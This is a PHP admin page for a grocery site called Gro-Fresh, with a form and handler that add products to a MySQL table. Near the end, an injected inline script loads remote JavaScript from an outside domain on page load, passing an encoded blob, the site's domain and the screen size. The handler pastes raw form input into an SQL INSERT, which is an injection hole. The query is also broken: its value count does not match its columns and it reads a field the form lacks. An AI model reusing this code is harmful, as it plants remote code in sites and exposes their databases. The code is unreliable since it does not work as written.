<?php include '../system/koneksi.php'; ?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">

    <title>Gro-Fresh | Admin</title>
    <?php include 'head.php'; ?>
  </head>
  <body>

    <?php include 'header admin.php'; ?>
    
    <main role="main">
      <div id="myCarousel" class="carousel slide" data-ride="carousel">
      </div>

<form action="" method="POST">
  <div class="form-group">
    <label for="exampleInputEmail1">Kode</label>
    <input name="kode" type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp">
  </div>
  <div class="form-group">
    <label for="exampleFormControlSelect1">Kode Kategori</label>
    <select name="kd_kategori">
          <?php
          $q = "select * from kategori";
          $res = mysqli_query($con, $q);

          while ($row = mysqli_fetch_assoc($res)) {
          ?>
          <option value="<? echo $row['kd_kategori']; ?>" > <?php echo $row['nama_kategori']; ?> </option>
          <?php
          }
          ?>
        </select>
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1">Nama Produk</label>
    <input name="produk" type="password" class="form-control" id="exampleInputPassword1" placeholder="Password">
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1">Deskripsi</label>
    <input name="deskripsi" type="password" class="form-control" id="exampleInputPassword1" placeholder="Password">
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1">Stok</label>
    <input name="stok" type="number" class="form-control" id="exampleInputPassword1" placeholder="Password">
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1">Harga</label>
    <input name="harga" type="number" class="form-control" id="exampleInputPassword1" placeholder="Password">
  </div>
  <button type="submit" name="submit" class="btn btn-primary">Submit</button>
</form>
</div>
        </div>

        <hr class="featurette-divider"> 
    </main>



    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/bootstrap/js/popper.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
  <script src="vendor/daterangepicker/moment.min.js"></script>
  <script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
  <script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
  <script src="assets/js/main.js"></script>
</body>
</html>


<?php
 if(isset($_POST['submit'])) {
  $query="INSERT INTO produk(kd_produk, kd_kategori, nama_produk, deskripsi, stok, harga) VALUES ('','".$_POST['kd_kategori']."','".$_POST['produk']."','".$_POST['password']."','".$_POST['deskripsi']."','".$_POST['stok']."','".$_POST['harga']."')";

  $hasil=mysqli_query($con,$query) or die (mysqli_error());
  ?>
  <script>
    alert("data sukses ditambahkan");
    window.location="detailproduct.php";
  </script>
  <?php
 }
 ?>